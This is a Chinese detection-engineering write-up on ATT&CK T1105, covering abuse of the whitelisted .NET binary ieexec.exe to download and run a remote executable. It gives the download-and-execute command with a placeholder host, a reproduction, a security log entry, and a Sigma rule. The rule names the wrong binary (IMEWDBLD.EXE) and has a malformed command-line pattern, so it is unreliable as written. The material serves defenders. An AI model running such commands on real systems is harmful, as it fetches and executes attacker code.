# T1105-win-入口工具转移-ieexec.exe(白名单)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。

## 测试案例
IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。可以将IEExec.exe应用程序用作主机，以运行使用URL启动的其他托管应用程序。

**路径:**
```
-   C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
-   C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
```

从远程服务器下载并执行 bypass.exe。  

```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```

用例：从远程位置下载并运行攻击者代码  
所需权限：用户  
操作系统：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

## 检测日志

windows安全日志

## 测试复现

```bash
Microsoft Windows [版本 10.0.18363.418]
(c) 2019 Microsoft Corporation。保留所有权利。

C:\Users\liyang>ieexec.exe
'ieexec.exe' 不是内部或外部命令，也不是可运行的程序
或批处理文件。

C:\Users\liyang>C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http://XXXX/QQ.exe
```

在Windows10环境下直接执行ieexec.exe提示异常，需要指定具体路径后才可以正常执行该命令。可将文中的QQ.exe替换成bypass文件即可。
## 测试留痕
```yml
已创建新进程。

  

创建者主题:

安全 ID: DESKTOP-PT656L6\liyang

帐户名: liyang

帐户域: DESKTOP-PT656L6

登录 ID: 0x47126

  

目标主题:

安全 ID: NULL SID

帐户名: -

帐户域: -

登录 ID: 0x0

  

进程信息:

新进程 ID: 0x1a24

新进程名称: C:\Windows\Microsoft.NET\Framework\v2.0.50727\IEExec.exe

令牌提升类型: %%1938

强制性标签: Mandatory Label\Medium Mandatory Level

创建者进程 ID: 0x1410

创建者进程名称: C:\Windows\System32\cmd.exe

进程命令行: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe  https://xxx/QQ.exe
```

## 检测方法/思路
### Sigma规则
```yml
title: ieexec.exe bypass
status: experimental
date: 2022/04/20
author: 12306Br0
tags:
- attack.command_and_control
- attack.t1105
references:
- https://www.codercto.com/a/104908.html
- https://lolbas-project.github.io/lolbas/Binaries/Ieexec/

logsource:
product: windows
category: security
selection:
    NewProcessName: \IMEWDBLD.EXE
    CommandLine:http*//
condition: selection
falsepositives:
- Unknown
level: medium
```

## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

ieexec.exe

<https://lolbas-project.github.io/lolbas/Binaries/ieexec/>

远控免杀专题(46)-白名单IEexec.exe执行payload  
  
<https://www.codercto.com/a/104908.html>